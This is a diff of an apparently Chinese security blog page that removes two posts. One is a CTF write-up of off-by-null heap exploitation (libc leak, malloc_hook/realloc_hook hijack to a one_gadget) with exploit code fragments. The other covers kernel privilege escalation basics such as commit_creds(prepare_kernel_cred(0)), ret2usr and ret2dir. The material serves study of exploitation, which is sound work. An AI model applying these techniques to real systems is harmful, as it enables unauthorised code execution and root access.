@@ -111,142 +111,6 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-38-53.png" alt="img"></p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-39-01.png" alt="img"></p>
 <p>这里可以看到，释放完三个chunk之后，再申请，会先得到chunk0，再得到chunk2，chunk1。所以这里也同样可以看出，在释放之后，该chunk的fd会被改写，指向下一个空闲chunk。只不过不用看size和其他七七八八的检查，只用fd即可打类似fastbin的攻击了，方便了很多。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pesp_off-by-null/">pesp_off-by-null</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.还是之前的2018网鼎杯的pesp题目。这里假设没有堆溢出，有PIE保护，无法劫持got表。只使用0字节溢出漏洞来获取libc地址，再根据得到的libc地址来更改malloc_hook和realloc_hook里面保存的地址为one_gadget，一步getshell。(realloc_hook为onegadget，malloc_hook为__libc_realloc函数中调整栈帧的地方)</p>
-<p>2.先梳理一下0字节溢出漏洞，一般的chunk改内容都是：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">read(0, chunk_ptr, size);</span><br></pre></td></tr></table></div></figure>
-
-<p>这样就只能输入size这么大的内容，但是这道题中，在add函数中和change函数中：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536207.jpeg" alt="img"></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536488.jpeg" alt="img"></p>
-<p>可以看到给chunk添加内容的语句都是：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">*(itemlist[i].cont + read(0, itemlist[i].cont, len)) = 0;// off by null</span><br></pre></td></tr></table></div></figure>
-
-<p>这样当我们将chunk内容顶满之后，程序会将chunk指针最后部分再溢出一个字节赋值为0，这就是off-by-null。</p>
-<p>由于scanf函数会在末尾自动补\x00，这其实也是一种off-by-null，</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">char buf[10];</span><br><span class="line">scanf(&quot;10%s&quot;,buf);</span><br></pre></td></tr></table></div></figure>
-
-<p>▲free源码：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((long ) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
-
-<p>也就是如果当前chunk的IN_USE位为0，那么就根据当前chunk的pre_size位，找到前一个chunk_pre，将chunk_pre的size位改成size+pre_size，通过Unlink取出chunk_pre，准备合并。(之后的检查代码会再循环，也就是再看chunk_pre的IN_USE位是不是0来判断要不要再向上合并，这里不重要)</p>
-<p>所以如果我们通过off-by-null，溢出0到chunk_next的size位中的IN_USE位，那么当前chunk就会被标记为Free，这样在Free(chunk_next)时，就会将chunk和chunk_next合并。如果我们又更改了chunk_next的pre_size位，使它变得更大，那么就可以向上合并更大的chunk块。这就是off-by-null的利用方法，这题中如下：</p>
-<p>(需要注意的是，由于溢出的是一个字节而不是一个Bit，所以size一般都设置为0xf0，从而使size位变成0x101，溢出之后进而变成0x100。但如果size最开始设置为0x20，size位就是0x30，溢出0字节就会变成0x00，那样程序照样崩溃。)</p>
-<p>(1)先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)</p>
-<p>(2)然后free掉chunk0，(这里chunk0需要足够大，一般得大于0x80，也就是MAX_fastbins)，使其进入unsortedbins中。(这里必须free掉chunk0，不然之后修改掉chunk2的pre_size位时，然后free掉chunk2时，程序依据pre_size来判断是否合并时，发现chunk0仍旧处于使用当中，但pre_size包含了chunk0，就会造成程序崩溃)</p>
-<p>(3)修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。</p>
-<p>(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中，调试过程可以发现，chunk0的size位被修改成了sizeof(chunk0+chunk1+chunk2)。但是这里实际情况中，chunk1并没有被释放，只是它的内存处在被释放的内存中间，依然可以通过chunk1的指针来操作。也就是在这个程序中依旧可以进行edit来修改chunk1，或者show来打印chunk1。</p>
-<p>(5)再次申请chunk0大小，这样就会割裂unsortedbins中的remainder为chunk0+new_remainder，把chunk0申请回来，剩下的new_remainder依旧放在unsortedbins中。在unsortedbins中的remainder有个特点，就是该chunk的fd和bk一定指向unsortedbins链表头部，(如果有多个remainder，那么顺序类似于smallbins，依旧可以使用第一个chunk的bk来获取unsortedbins链表头部)</p>
-<p>(6)那么现在unsortedbins中有chunk1和chunk2，而chunk1的fd和bk都指向unsortedbins链表头部，并且在程序中chunk1仍旧处于使用状态，fd和bk就是chunk1的data部分。所以show函数就可以打印出chunk1的data部分，从而打印出fd和bk指向的unsortedbins头部链表地址。又由于unsortedbins处在main_arena+0x58位置，而main_arena相对于libc基地址的偏移是固定的，为0x3c4b20(不同glibc版本可能不同，这是libc2.23的)，所以这也就间接泄露出了libc基地址。</p>
-<p>▲查询main_arena方法：</p>
-<p>①工具查询：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/coldwave96/libcoffset%EF%BC%9A" >https://github.com/coldwave96/libcoffset：</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>②IDA查询：main_arena存储在libc.so.6文件的.data段，使用IDA打开libc文件，然后搜索函数malloc_trim()</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537434.jpeg" alt="img"></p>
-<p>3.现在有了libc基地址，那么接下来就考虑修改mallo_hook和realloc_hook的值。同样使用0字节溢出漏洞，伪造fakechunk为mallo_hook地址，修改fakechunk从而修改malloc_hook和realloc_hook。这里先忽略上面的，程序中的索引会不太一样。攻击思路如下：</p>
-<p>(1)先申请一个较大的chunk，防止和上面的合并</p>
-<p>(2)之后的操作方法类似，先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)</p>
-<p>(3)free掉chunk0，使其进入unsortedbins中。修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。</p>
-<p>(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中。再free掉chunk1，使其进入fastbins中。这样chunk1即在fastbins中，也处在unsortedbins中。</p>
-<p>(5)申请一个特殊大小的chunk块，最小为chunk0_size+0x20，使其的data部分足够大，能够修改掉chunk1的fd位，将chunk1的fd位指向fakechunk，由于需要从size位覆盖到fd，所以需要伪造合法的size，为chunk1_size。</p>
-<p>(6)申请两个chunk1大小的chunk_a，chunk_b，这样第一次申请的chunk_a就是从fastbins中回来的chunk1。而chunk_b就是chunk1的fd指向的fakechunk。这样如果将fakechunk放在realloc_hook之前，那么就可以修改掉realloc_hook和malloc_hook，使得realloc_hook指向one_gadget，而malloc_hook指向__libc_libc函数中的某个可以控制栈帧的地址，从而满足gadget条件来getshell。</p>
-<p>4.开始编写exp，增删改查函数就不说了:</p>
-<p>(1)获取libc基地址：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0xf0,&#x27;0&#x27;*0xf0)</span><br><span class="line">add(0x68,&#x27;1&#x27;*0x68)#trigger 0ff-by-null</span><br><span class="line">add(0xf0,&#x27;2&#x27;*0xf0)</span><br><span class="line">add(0x10,&#x27;3&#x27;*0x10)</span><br><span class="line">#chunk0,chunk1,chunk2,chunk3(防止合并)</span><br><span class="line"></span><br><span class="line">delete(0)#防止程序崩溃</span><br><span class="line">edit(1,0x68,flat(&#x27;1&#x27;*0x60,0x170))</span><br><span class="line">#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中</span><br><span class="line">delete(2)</span><br><span class="line">#触发chunk2的pre_size作用</span><br><span class="line"></span><br><span class="line">#关键就在这个add，目的就是将unsortedbins的链表头部放到chunk1的fd和bk位</span><br><span class="line">add(0xf0,&#x27;x&#x27;*0x10)</span><br><span class="line"></span><br><span class="line">#现在就可以打印chunk1来获取unsortedbins链表的头部地址，从而计算得到libc地址</span><br><span class="line">show()</span><br><span class="line">libc_address = u64(io.recvuntil(&quot;\x7f&quot;)[-6: ]+&#x27;\0\0&#x27;)-0x3c4b78</span><br><span class="line">print(&quot;libc @ &#123;:#x&#125;&quot;.format(libc_address))</span><br></pre></td></tr></table></div></figure>
-
-<p>(2)伪造fakechunk：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0x160,&#x27;4&#x27;*0x160)</span><br><span class="line">#第一个chunk防止合并加程序崩溃</span><br><span class="line"></span><br><span class="line">add(0xf0,&#x27;a&#x27;*0xf0)</span><br><span class="line">add(0x68,&#x27;b&#x27;*0x68)</span><br><span class="line">add(0xf0,&#x27;c&#x27;*0xf0)</span><br><span class="line">add(0x10,&#x27;d&#x27;*0x10)</span><br><span class="line">#四个chunk，套路一样。由于程序编写原因，所以索引变成chunk4,chunk5,chunk6,chunk7,对应上面的chunk0,chunk1,chunk2,chunk3。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(4)#防止程序崩溃</span><br><span class="line">edit(5,0x68,flat(&#x27;b&#x27;*0x60,0x170))</span><br><span class="line">#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中</span><br><span class="line">delete(6)</span><br><span class="line">#触发chunk6的pre_size作用</span><br><span class="line"></span><br><span class="line">delete(5)</span><br><span class="line">add(0x120,flat(&#x27;A&#x27;*0xf8,0x70,(libc_address+0x3c4aed)))</span><br><span class="line">#使得chunk5进入fastbins，之后修改其fd位，创造一个fakechunk进入fastbins。这里的fakechunk_addr就是libc_address+0x3c4aed。这里的0x70写成0x71也是一样的，因为之后是malloc，不会管chunk的IN_USE位，也就是P位。</span><br></pre></td></tr></table></div></figure>
-
-<p>(3)申请获得fakechunk，同时修改该fakechunk，劫持malloc_hook和realloc_hook。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">add(0x68,&#x27;x&#x27;*0x10)</span><br><span class="line">add(0x68,flat(&#x27;\0&#x27;*11,(libc_address+one_gadget),(libc_address+16+libc.sym[&quot;__libc_realloc&quot;])))</span><br></pre></td></tr></table></div></figure>
-
-<p>(4)随便申请一个chunk即可getshell，但是这里不要使用之前我们定义的add函数，因为程序一旦call malloc即可getshell，即运行到输入长度即可，但是我们的add函数中一直运行到输入内容才结束，会导致程序卡住，所以应该是：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">io.sendlineafter(&quot;:&quot;,&quot;anything&quot;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
-
-<p>5.这里需要很多调试的步骤：</p>
-<p>(1)从最开始打算伪造fakechunk时就应该知道我们的chunk大小应该设置为0x68，因为程序跑起来是0x7f开头，拿来伪造size再合适不过，这样的chunk大小是0x70。而我们又只能用0字节溢出，所以需要将chunk设置到最大，也就是0x70-0x08。</p>
-<p>(2)而0xf0可以改变，只要比fastbins_MAX大就行，那么对应的0x170也需要改变，同时也要改变0x120。</p>
-<p>(3)申请fakechunk步骤中的’\0’*11也是需要通过调试算出来，方法就是gdb查看realloc_hook-0xxx附近的内存，选择合适的可以伪造size的地址，之后通过填充padding来覆盖realloc_hook和malloc_hook。</p>
-<p>(4)onegadget相关的+16也得通过调试才能知道，这里选取的onegadget条件是[rsp+0x30]==Null。所以调试时将断点下在__libc_realloc函数上，进入__libc_realloc函数，从而一直进入到onegadget的执行代码中，如下：</p>
-<p>先下断点让程序运行到这<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536075.jpeg" alt="img"></p>
-<p>再输入ni进入:<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537426.jpeg" alt="img"></p>
-<p>这时候就可以看rsp的值了：<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536542.jpeg" alt="img"></p>
-<p>这里的rsp是0x7ffca3331eb8，rsp+0x30=0x7ffca3331ee8，对应图中的值就得是0才满足条件(这里已经计算过了，+16)</p>
-<p>▲如果从最开始进入__libc_realloc函数，进入到onegadget中之后，发现条件不满足，那么需要观察前后的值，从而决定从哪里进入__libc_realloc函数才能使得rsp满足。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536192.jpeg" alt="img"></p>
-<p>因为__libc_realloc(就是realloc)函数有一堆的push和sub操作，少一个push，那么rsp就可以下挪0x08，相当于rsp+0x08，中间还有sub rsp,xxh，相当于上挪rsp。所以决定从哪里进入realloc函数决定了onegadget的成功与否。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536822.jpeg" alt="img"></p>
-<p>而通过汇编代码可以看到，实际的onegaget是通过0x84724 mov rax,cs:__realloc_hook_ptr传进来，之后由于</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">test rax rax</span><br><span class="line">jnz  loc_84958</span><br></pre></td></tr></table></div></figure>
-
-<p>rax不为0，必定跳转loc_84958:</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191538482.jpeg" alt="img"></p>
-<p>这里才是我们选择调用进入onegadget的入口。所以之前在__libc_realloc的计算都是为了调整栈帧，不然其实如果栈帧不用调整就可以满足，那么我们可以直接将malloc_hook改成onegadget也可以直接getshell。因为__libc_malloc函数中的汇编代码也是类似的：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536213.jpeg" alt="img"></p>
-<p>而且这还是一个无条件跳转。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536275.jpeg" alt="img"></p>
-<p>可以看到有两个push,一个sub rsp,8;两个Pop。相当于只要在call malloc之前，我们的rsp+0x28==NULL即可满足onegadget的rsp+0x30==NULL的条件。当然，以上只是在Libc2.23下的，如果是其它版本的libc就可能不太一样。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwn-kernel_%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/">pwn-kernel_前置知识</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、内核前置基础知识：</p>
-<p>1.physmap：</p>
-<p>physmap是内核管理的一块非常大的连续的虚拟内存空间，为了提高效率，该空间地址和RAM地址直接映射。RAM相对physmap要小得多，导致了任何一个RAM地址都可以在physmap中找到其对应的虚拟内存地址，而用户空间的虚拟内存也会映射到RAM。</p>
-<p>所以可能会形成如下关系：</p>
-<p>usr_data—&gt;RAM—-&gt;physmap</p>
-<p>那么physmap中就有可能会保存usr_data，那么就为提权代码放到内核空间提供了前置条件，同时有mmap就可能会导致条件竞争。</p>
-<p>2.ioctl：系统调用，用于与设备通信</p>
-<p>由于内核和用户空间隔离开，所以就需要一个接口来使得用户可以在一定情况下访问内核空间：</p>
-<p>int ioctl(int fd, unsigned long request, …)</p>
-<p>第一个参数为打开设备 (open) 返回的文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p>
-<p>3.状态转换相关操作：</p>
-<p>当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换</p>
-<p>ENTRY(entry_SYSCALL_64)</p>
-<p>(1).用户态至内核态：</p>
-<p>①swapgs指令触发，切换到kernel GS：</p>
-<p>SWAPGS_UNSAFE_STACK</p>
-<p>②保存栈值，设置内核栈：</p>
-<p>movq %rsp, PER_CPU_VAR(rsp_scratch)</p>
-<p>movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</p>
-<p>③压栈保存寄存器：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#注释头 </span><br><span class="line"></span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS      /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx             /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax             /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi             /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi             /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx             /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu    /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS        /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8              /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9              /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10             /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></div></figure>
-
-<p>④判断类型并跳转：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">movq PER_CPU_VAR(current_task), %r11</span><br><span class="line">testl $_TIF_WORK_SYSCALL_ENTRY|_TIF_ALLWORK_MASK, TASK_TI_flags(%r11)</span><br><span class="line">jnz entry_SYSCALL64_slow_path</span><br></pre></td></tr></table></div></figure>
-
-<p>▲</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">entry_SYSCALL64_slow_path:</span><br><span class="line">  /* IRQs are off. */</span><br><span class="line">  SAVE_EXTRA_REGS</span><br><span class="line">  movq    %rsp, %rdi</span><br><span class="line">  call    do_syscall_64        /* returns with IRQs disabled */</span><br></pre></td></tr></table></div></figure>
-
-<p>(2)内核态至用户态：</p>
-<p>①swapgs恢复GS</p>
-<p>②iretq（加上寄存器信息）或sysretq，如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</p>
-<p>kernel 的 crash 通常会引起重启</p>
-<p>4.相关保护技术Mitigation：</p>
-<p>(1)SMAP和SMEP保护技术：</p>
-<p>(arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never))</p>
-<p>①SMAP:禁止内核访问用户空间的数据(Supervisor Mode Access Prevention)</p>
-<p>②SMEP:禁止内核执行用户空间的代码(Supervisor Mode Execution Prevention)</p>
-<p>内核命令行中添加nosmap和nosmep禁用</p>
-<p>(2)kernel canary:</p>
-<p>编译内核时设置CONFIG_CC_STACKPROTECTOR，可以起到类似于stack canary的技术。</p>
-<p>(3)KALSR：内核地址随机化</p>
-<p>5.提权代码与函数结构体：</p>
-<p>cred结构体：kernel用cred结构体记录进程权限(每个结构都有一个cred结构)，保存了进程的相关信息，如果利用这个cred就可以提权。一般调用commit_creds(prepare_kernel_cred(0))完成提权然后用户态“着陆”起shell。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct cred &#123;</span><br><span class="line">    atomic_t    usage;</span><br><span class="line">#ifdef CONFIG_DEBUG_CREDENTIALS</span><br><span class="line">    atomic_t    subscribers;           /* number of processes subscribed */</span><br><span class="line">    void        *put_addr;</span><br><span class="line">    unsigned    magic;</span><br><span class="line">#define CRED_MAGIC  0x43736564</span><br><span class="line">#define CRED_MAGIC_DEAD 0x44656144</span><br><span class="line">#endif</span><br><span class="line">    kuid_t      uid;                   /* real UID of the task */</span><br><span class="line">    kgid_t      gid;                   /* real GID of the task */</span><br><span class="line">    kuid_t      suid;                  /* saved UID of the task */</span><br><span class="line">    kgid_t      sgid;                  /* saved GID of the task */</span><br><span class="line">    kuid_t      euid;                  /* effective UID of the task */</span><br><span class="line">    kgid_t      egid;                  /* effective GID of the task */</span><br><span class="line">    kuid_t      fsuid;                 /* UID for VFS ops */</span><br><span class="line">    kgid_t      fsgid;                 /* GID for VFS ops */</span><br><span class="line">    unsigned    securebits;            /* SUID-less security management */</span><br><span class="line">    kernel_cap_t    cap_inheritable;   /* caps our children can inherit */</span><br><span class="line">    kernel_cap_t    cap_permitted;     /* caps we&#x27;re permitted */</span><br><span class="line">    kernel_cap_t    cap_effective;     /* caps we can actually use */</span><br><span class="line">    kernel_cap_t    cap_bset;          /* capability bounding set */</span><br><span class="line">    kernel_cap_t    cap_ambient;       /* Ambient capability set */</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">    unsigned char   jit_keyring;       /* default keyring to attach requested</span><br><span class="line">    /* keys to */</span><br><span class="line">    struct key __rcu *session_keyring; /* keyring inherited over fork */</span><br><span class="line">    struct key  *process_keyring;      /* keyring private to this process */</span><br><span class="line">    struct key  *thread_keyring;       /* keyring private to this thread */</span><br><span class="line">    struct key  *request_key_auth;     /* assumed request_key authority */</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_SECURITY</span><br><span class="line">    void        *security;             /* subjective LSM security */</span><br><span class="line">#endif</span><br><span class="line">    struct user_struct *user;          /* real user ID subscription */</span><br><span class="line">    struct user_namespace *user_ns;    /* user_ns the caps and keyrings are relative to. */</span><br><span class="line">    struct group_info *group_info;     /* supplementary groups for euid/fsgid */</span><br><span class="line">    struct rcu_head rcu;               /* RCU deletion hook */</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></div></figure>
-
-<p>不同内核版本的cred结构体可能不太一样。</p>
-<p>二、内核态函数及相关变化：</p>
-<p>1.printf() -&gt; printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 dmesg 查看效果</p>
-<p>2.malloc() -&gt; kmalloc()，内核态的内存分配函数，和malloc()相似，但使用的是slab/slub分配器。</p>
-<p>3.free() -&gt; kfree()，同 kmalloc()</p>
-<p>4.memcpy() -&gt; copy_from_user()/copy_to_user()</p>
-<p>5.copy_from_user() 实现了将用户空间的数据传送到内核空间</p>
-<p>6.copy_to_user() 实现了将内核空间的数据传送到用户空间</p>
-<p>7.提权相关函数：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int commit_creds(struct cred *new)</span><br><span class="line">struct cred* prepare_kernel_cred(struct task_struct* daemon)</span><br></pre></td></tr></table></div></figure>
-
-<p>执行commit_creds(prepare_kernel_cred(0))即可获得 root 权限</p>
-<p>函数地址可在/proc/kallsyms，老版本/proc/ksyms中查看(cat|grep)，权限一般需要root</p>
-<p>三、保护绕过技术：</p>
-<p>1.ret2usr:</p>
-<p>在没有SMAP/SMEP的情况下把内核指针重定向到用户空间的漏洞利用方式被称为ret2usr</p>
-<p>2.ret2dir：</p>
-<p>如果用户空间用mmap()把提权代码映射到内存RAM，那么就可以在physmap里找到其对应的副本，就可以修改EIP跳到副本执行，这种利用方式被称为ret2dir。</p>
-<p>3.kernel canary:</p>
-<p>绕过方法同用户空间的canary绕过大致相同，编译内核时设置CONFIG_CC_STACKPROTECTOR，可以起到类似于stack canary的技术。</p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwn-kernel_%E5%81%9A%E9%A2%98%E7%9F%A5%E8%AF%86/">pwn-kernel_做题知识</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-14</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、题目给的文件：</p>
 <p>1.bzImage：就是linux编译后的运行内核，在启动参数中设置即可。</p>
 <p>2.file.cpio：题目给的，有的可以直接用qemu启动运行，但是有的需要解压后再打包，具体看题目。</p>
@@ -325,78 +189,118 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
